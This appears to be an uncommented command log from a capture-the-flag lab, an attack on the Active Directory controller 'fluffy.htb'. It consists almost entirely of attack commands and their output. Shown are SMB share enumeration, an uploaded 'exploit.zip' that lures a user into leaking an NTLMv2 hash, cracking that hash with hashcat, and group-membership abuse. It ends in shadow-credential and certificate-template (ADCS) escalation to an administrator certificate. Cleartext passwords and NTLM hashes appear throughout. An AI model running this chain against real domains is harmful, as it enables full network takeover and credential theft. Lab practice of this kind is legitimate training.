sudo nmap -sC -sV 10.129.16.252
[sudo] password for hlib: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-15 20:25 EEST
Nmap scan report for 10.129.16.252
Host is up (0.047s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-16 00:25:44Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-06-16T00:27:04+00:00; +6h59m58s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-06-16T00:27:04+00:00; +6h59m58s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-06-16T00:27:04+00:00; +6h59m58s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-06-16T00:27:04+00:00; +6h59m58s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-16T00:26:26
|_  start_date: N/A
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.82 seconds

---

crackmapexec smb 10.129.16.252 -u "j.fleischman" -p "J0elTHEM4n1990!" --shares
SMB         10.129.16.252   445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.16.252   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.16.252   445    DC01             [*] Enumerated shares
SMB         10.129.16.252   445    DC01             Share           Permissions     Remark
SMB         10.129.16.252   445    DC01             -----           -----------     ------
SMB         10.129.16.252   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.16.252   445    DC01             C$                              Default share
SMB         10.129.16.252   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.16.252   445    DC01             IT              READ,WRITE      
SMB         10.129.16.252   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.16.252   445    DC01             SYSVOL          READ            Logon server share

---

smbclient //10.129.16.252/IT -U "j.fleischman%J0elTHEM4n1990!"
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jun 16 03:26:45 2026
  ..                                  D        0  Tue Jun 16 03:26:45 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 18:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 18:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 18:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 18:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 17:31:07 2025

		5842943 blocks of size 4096. 1747620 blocks available
smb: \> get *
NT_STATUS_OBJECT_NAME_INVALID opening remote file \*
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (112.5 KiloBytes/sec) (average 112.5 KiloBytes/sec)
smb: \> cd KeePass-2.58
smb: \KeePass-2.58\> dir
  .                                   D        0  Fri Apr 18 18:08:38 2025
  ..                                  D        0  Fri Apr 18 18:08:38 2025
  KeePass.chm                         A   768478  Tue Mar  4 19:26:42 2025
  KeePass.exe                         A  3305824  Tue Mar  4 19:24:30 2025
  KeePass.exe.config                  A      763  Tue Mar  4 19:27:04 2025
  KeePass.XmlSerializers.dll          A   463264  Tue Mar  4 19:25:02 2025
  KeePassLibC32.dll                   A   609136  Tue Mar  4 19:18:42 2025
  KeePassLibC64.dll                   A   785776  Tue Mar  4 19:20:42 2025
  Languages                          Dn        0  Tue Mar  4 19:27:06 2025
  License.txt                         A    18710  Thu Jan  2 00:32:38 2025
  Plugins                            Dn        0  Tue Mar  4 19:27:06 2025
  ShInstUtil.exe                      A    97128  Tue Mar  4 19:26:12 2025
  XSL                                Dn        0  Fri Apr 18 18:08:38 2025

		5842943 blocks of size 4096. 1769560 blocks available
smb: \KeePass-2.58\> put exploit.zip
putting file exploit.zip as \KeePass-2.58\exploit.zip (1.8 kb/s) (average 1.8 kb/s)
smb: \KeePass-2.58\> dir
  .                                   D        0  Tue Jun 16 03:43:14 2026
  ..                                  D        0  Tue Jun 16 03:43:14 2026
  exploit.zip                         A      323  Tue Jun 16 03:43:14 2026
  KeePass.chm                         A   768478  Tue Mar  4 19:26:42 2025
  KeePass.exe                         A  3305824  Tue Mar  4 19:24:30 2025
  KeePass.exe.config                  A      763  Tue Mar  4 19:27:04 2025
  KeePass.XmlSerializers.dll          A   463264  Tue Mar  4 19:25:02 2025
  KeePassLibC32.dll                   A   609136  Tue Mar  4 19:18:42 2025
  KeePassLibC64.dll                   A   785776  Tue Mar  4 19:20:42 2025
  Languages                          Dn        0  Tue Mar  4 19:27:06 2025
  License.txt                         A    18710  Thu Jan  2 00:32:38 2025
  Plugins                            Dn        0  Tue Mar  4 19:27:06 2025
  ShInstUtil.exe                      A    97128  Tue Mar  4 19:26:12 2025
  XSL                                Dn        0  Fri Apr 18 18:08:38 2025

		5842943 blocks of size 4096. 1874672 blocks available
smb: \KeePass-2.58\> cd ../
smb: \> put exploit.zip
\putting file exploit.zip as \exploit.zip (0.9 kb/s) (average 1.2 kb/s)
smb: \> \dir
\dir: command not found
smb: \> dir
  .                                   D        0  Tue Jun 16 03:43:26 2026
  ..                                  D        0  Tue Jun 16 03:43:26 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 18:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 18:04:05 2025
  exploit.zip                         A      323  Tue Jun 16 03:43:26 2026
  KeePass-2.58                        D        0  Tue Jun 16 03:43:14 2026
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 18:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 17:31:07 2025

		5842943 blocks of size 4096. 1878394 blocks available
smb: \> 

---

[!] Error starting TCP server on port 53, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:af53e98830794df6:E9E1449D6118CC71944BCB2D0DE68D5F:0101000000000000007D3C8BD9FDDC01A93B81A2649F3FB900000000020008005200390043004D0001001E00570049004E002D003900450053004A0056004D003400510043005400530004003400570049004E002D003900450053004A0056004D00340051004300540053002E005200390043004D002E004C004F00430041004C00030014005200390043004D002E004C004F00430041004C00050014005200390043004D002E004C004F00430041004C0007000800007D3C8BD9FDDC0106000400020000000800300030000000000000000100000000200000AAFFB7AA23D0D20C3293182D38C609CDA09C9A3C1B068848C3DD03F14F1FACAD0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100390036000000000000000000
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila

---

hashcat -m 5600 ../hash /usr/share/wordlist/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i5-8265U CPU @ 1.60GHz, 14914/29893 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: /usr/share/wordlist/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

P.AGILA::FLUFFY:af53e98830794df6:e9e1449d6118cc71944bcb2d0de68d5f:0101000000000000007d3c8bd9fddc01a93b81a2649f3fb900000000020008005200390043004d0001001e00570049004e002d003900450053004a0056004d003400510043005400530004003400570049004e002d003900450053004a0056004d00340051004300540053002e005200390043004d002e004c004f00430041004c00030014005200390043004d002e004c004f00430041004c00050014005200390043004d002e004c004f00430041004c0007000800007d3c8bd9fddc0106000400020000000800300030000000000000000100000000200000aaffb7aa23d0d20c3293182d38c609cda09c9a3c1b068848c3dd03f14f1facad0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100390036000000000000000000:prometheusx-303

---

bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.232.88 add groupMember 'service accounts' p.agila
[+] p.agila added to service accounts

---

sudo ntpdate dc01.fluffy.htb

certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc

---

evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb

---

crackmapexec ldap 10.129.232.88 -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -M adcs

---

certipy-ad find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -vulnerable -enabled -stdout

---

certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator'
certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.129.232.88' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'ca_svc@fluffy.htb'

---

certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.232.88